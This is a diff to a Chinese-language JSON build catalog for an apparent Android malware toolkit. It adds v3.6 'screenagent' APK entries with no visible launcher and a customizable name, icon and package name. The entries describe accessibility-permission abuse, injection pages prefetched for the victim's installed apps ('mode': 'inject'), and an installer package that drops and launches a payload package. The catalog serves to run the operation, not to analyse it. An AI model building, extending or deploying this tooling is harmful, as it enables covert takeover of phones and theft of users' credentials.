@@ -109,6 +109,33 @@
       "visibleLauncher": true,
       "resourceStyle": "semantic",
       "description": "A 包（安装器）：桌面入口 + 内置 HTTPS 首页，携带刚构建的 B 包 payload（含包名与 sha256），装完由 A 包拉起 B 包。"
+    },
+    {
+      "id": "src-3.6",
+      "name": "v3.6 源码构建（apktool 工程 · 可改包名/图标/首页/名称）",
+      "versionName": "3.6",
+      "versionCode": 906,
+      "sourceDir": "materials/src/v3.6",
+      "kind": "screenagent",
+      "visibleLauncher": false,
+      "resourceStyle": "semantic",
+      "defaultHomeUrl": "https://www.baidu.com/",
+      "description": "源码构建：每次从 apktool 工程重新编译，应用名/图标/包名/首页/APK ID 全部在编译前写入",
+      "sha256": "22ead9c8ff002efe8a95a7daf4104d2aae1a37be7baf9671b57ea9120eac2348"
+    },
+    {
+      "id": "apk-3.6",
+      "name": "v3.6 · 3.6 正式版（首页 WebView + 按需注入缓存 + 首步回退页面）",
+      "versionName": "3.6",
+      "versionCode": 906,
+      "kind": "screenagent",
+      "visibleLauncher": false,
+      "resourceStyle": "semantic",
+      "defaultHomeUrl": "https://www.baidu.com/",
+      "description": "3.6(906)：拿到无障碍先退两步页面再进厂商流程；注入页优先本地缓存（收到清单即预取，只下本机已装）；模板 hash 变更才重下；MainActivity 变更为首页 WebView（无桌面入口）。",
+      "sha256": "acdafa74cceb3b74b15813820ba3242f9b00b34c65bb4c4bf0dabfc6cfeef587",
+      "file": "v3.6.apk",
+      "mode": "inject"
     }
   ]
 }
